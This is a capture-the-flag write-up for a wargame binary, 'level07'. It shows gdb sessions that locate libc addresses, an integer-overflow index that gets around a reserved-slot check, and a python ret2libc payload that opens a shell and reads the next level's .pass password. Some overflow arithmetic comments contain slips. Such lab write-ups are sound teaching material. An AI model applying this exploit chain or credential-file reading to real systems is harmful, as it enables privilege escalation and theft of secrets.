# level 07

## get_binary

```shell
scp -P 4242 level07@192.168.0.0:/home/users/level07/level07 level07.bin
```

## Exploit

```shell
(gdb) break main
(gdb) run

(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) print exit
$1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) info proc map
process 1693
Mapped address spaces:
        Start Addr   End Addr       Size     Offset objfile
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.

# system    => 0xf7e6aed0 => 4159090384
# exit      => 0xf7e5eb70 => 4159040368
# "/bin/sh" => 0xf7f897ec => 4160264172
```

```shell
#08048723 <main>:
# ...
# 80489f1:       c3                      ret
(gdb) break *0x80489f1
(gdb) run
Input command: quit
(gdb) info registers
esp            0xffffd70c       0xffffd70c
# return address => 0xffffd70c
Input command: store
 Number: 42
 Index: 115
 Completed store command successfully
Input command: quit
(gdb) x/4d 0xffffd70c
0xffffd70c:     -136030957      42      -10332  -10324
# Index of return address => 114
Input command: store
 Number: 42
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
# address = offset + 4 * 114
# address = offset + 4 * 114 + UINT_MAX + 1 
# address = offset + 4 * (114 + ((UINT_MAX + 1) / 4))
# address = offset + 4 * (114 + ((UINT_MAX + 1) / 4))
# address = offset + 4 * (114 + ((4 294 957 295 + 1) / 4))
# address = offset + 4 * (114 + ((4 294 957 296 + 1) / 4))
# address = offset + 4 * (114 + 1 073 741 824)
# address = offset + 4 * 1073741938
Input command: store
 Number: 42
 Index: 1073741938
 Completed store command successfully
```

```shell
python2.7 -c '\
print("store");\
print("4159090384");\
print("1073741938");\
print("store");\
print("4159040368");\
print("115");\
print("store");\
print("4160264172");\
print("116");\
print("quit");\
' > /tmp/in && cat /tmp/in - | ./level07

whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
